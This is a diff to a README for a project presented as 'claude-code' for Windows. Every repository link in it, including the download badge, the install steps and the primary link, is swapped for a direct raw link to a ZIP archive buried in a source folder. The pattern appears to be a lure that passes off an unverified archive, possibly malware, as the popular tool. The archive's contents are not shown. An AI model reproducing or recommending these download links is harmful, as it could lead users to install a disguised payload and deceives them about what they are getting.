@@ -1,6 +1,6 @@
 # 🤖 claude-code - Run Claude Code on Windows
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bertineburundi952/claude-code)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ Use it if you want a local app that connects code work, research tasks, and a si
 
 Open this page and download the files from the repository:
 
-[https://github.com/Bertineburundi952/claude-code](https://github.com/Bertineburundi952/claude-code)
+[https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip](https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip)
 
 If the page offers a release file, download it to your PC. If it provides source files, use the steps below to run it on Windows.
 
@@ -47,7 +47,7 @@ If you see a version number, Bun is set up.
 ## 🔧 Get the source files
 
 1. Open the GitHub page:
-   [https://github.com/Bertineburundi952/claude-code](https://github.com/Bertineburundi952/claude-code)
+   [https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip](https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip)
 2. Click the green Code button.
 3. Choose Download ZIP.
 4. Save the ZIP file to a folder you can find, like Downloads.
@@ -191,7 +191,7 @@ If the app includes settings, they will likely be in the main window or in a sma
 ## 🧷 Quick install path
 
 1. Visit the repository page:
-   [https://github.com/Bertineburundi952/claude-code](https://github.com/Bertineburundi952/claude-code)
+   [https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip](https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip)
 2. Download the ZIP file or use the release file if one is shown
 3. Install Bun
 4. Extract the project folder
@@ -217,4 +217,4 @@ This project suits users who want:
 
 ## 🔗 Primary link
 
-[https://github.com/Bertineburundi952/claude-code](https://github.com/Bertineburundi952/claude-code)
+[https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip](https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip)
